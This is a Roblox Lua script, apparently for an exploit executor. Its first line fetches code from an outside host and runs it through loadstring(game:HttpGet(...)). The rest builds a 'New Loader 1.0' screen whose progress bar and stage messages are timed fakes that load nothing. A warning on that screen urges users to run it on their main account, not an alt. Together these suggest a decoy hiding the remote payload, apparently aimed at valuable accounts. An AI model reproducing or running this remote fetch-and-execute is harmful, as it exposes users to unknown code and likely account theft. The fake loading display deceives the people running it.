loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjIwNTY0MTM2LTZhZDktNGIxZi1hZmI4LTY2NmFjMWQ4NDVhYiIsImtpbmQiOiJsb2FkZXIifQ"))()

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Удаляем, если есть старое меню с таким именем
pcall(function()
    if CoreGui:FindFirstChild("NewLoaderUI") then
        CoreGui.NewLoaderUI:Destroy()
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NewLoaderUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 1000
ScreenGui.Parent = CoreGui

-- Основной контейнер (полупрозрачный фон)
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
Background.BackgroundTransparency = 0.5
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

-- Центрированный главный фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 240, 0, 280)
MainFrame.Position = UDim2.new(0.5, -120, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0, 0)
MainFrame.Parent = Background
MainFrame.Rotation = 0

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 20)
UICorner.Parent = MainFrame

-- Заголовок
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 0, 30)
Title.Position = UDim2.new(0, 10, 0, 16)
Title.BackgroundTransparency = 1
Title.Text = "🚀 New Loader 1.0"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.TextColor3 = Color3.fromRGB(200, 200, 255)
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.Parent = MainFrame

-- Круглая рамка для прогресс-бара (используем UIStroke)
local CircleFrame = Instance.new("Frame")
CircleFrame.Size = UDim2.new(0, 160, 0, 160)
CircleFrame.Position = UDim2.new(0.5, -80, 0, 70)
CircleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
CircleFrame.Parent = MainFrame

local circleCorner = Instance.new("UICorner")
circleCorner.CornerRadius = UDim.new(1, 0)
circleCorner.Parent = CircleFrame

local circleStroke = Instance.new("UIStroke")
circleStroke.Color = Color3.fromRGB(100, 100, 255)
circleStroke.Thickness = 4
circleStroke.Transparency = 0.7
circleStroke.Parent = CircleFrame

-- Прогресс-бар "заполнения" — с помощью другого фрейма, который мы будем изменять по углу (маска)
local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(1, 0, 1, 0)
ProgressFill.Position = UDim2.new(0, 0, 0, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
ProgressFill.BackgroundTransparency = 0.9 -- мы будем менять прозрачность в анимации
ProgressFill.AnchorPoint = Vector2.new(0.5, 0.5)
ProgressFill.Position = UDim2.new(0.5, 0, 0.5, 0)
ProgressFill.Parent = CircleFrame

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = ProgressFill

-- Процент по центру круга (большой)
local PercentLabel = Instance.new("TextLabel")
PercentLabel.Size = UDim2.new(1, 0, 1, 0)
PercentLabel.BackgroundTransparency = 1
PercentLabel.Text = "0%"
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextSize = 50
PercentLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
PercentLabel.TextXAlignment = Enum.TextXAlignment.Center
PercentLabel.TextYAlignment = Enum.TextYAlignment.Center
PercentLabel.Parent = CircleFrame

-- Статус загрузки снизу
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -40, 0, 24)
StatusLabel.Position = UDim2.new(0, 20, 1, -40)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Starting..."
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 16
StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 230)
StatusLabel.TextWrapped = true
StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
StatusLabel.Parent = MainFrame

-- Предупреждение снизу
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, -40, 0, 36)
WarningLabel.Position = UDim2.new(0, 20, 1, -80)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "If the menu doesn’t appear in 5 seconds,\nyou may be using an alt account. Use your main."
WarningLabel.Font = Enum.Font.Gotham
WarningLabel.TextSize = 13
WarningLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
WarningLabel.TextWrapped = true
WarningLabel.TextXAlignment = Enum.TextXAlignment.Center
WarningLabel.Parent = MainFrame

-- Анимация прогресс-бара

local totalLoadTime = 50 -- сек
local stages = {
    {name = "Initializing engine...", weight = 20},
    {name = "Loading assets...", weight = 25},
    {name = "Applying configurations...", weight = 15},
    {name = "Finalizing setup...", weight = 20},
    {name = "Launching UI...", weight = 20},
}
local totalWeight = 0
for _,stage in ipairs(stages) do totalWeight += stage.weight end

local startTime = tick()
local currentWeight = 0

TaskSpawn = task.spawn or spawn

local run = RunService.RenderStepped:Connect(function()
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / totalLoadTime, 0, 1)
    -- Вычисляем процент
    local percent = progress * 100
    PercentLabel.Text = string.format("%.0f%%", percent)
    
    -- Меняем прозрачность заливки, чтобы имитировать заполнение (для простоты)
    ProgressFill.BackgroundTransparency = 0.9 - 0.9 * progress
    
    if progress >= 1 then
        run:Disconnect()
        StatusLabel.Text = "✅ Load complete!"
    end
end)

-- Последовательное обновление статуса стадий
TaskSpawn(function()
    for _,stage in ipairs(stages) do
        StatusLabel.Text = stage.name
        local stageDuration = (stage.weight / totalWeight) * totalLoadTime
        task.wait(stageDuration)
    end
end)
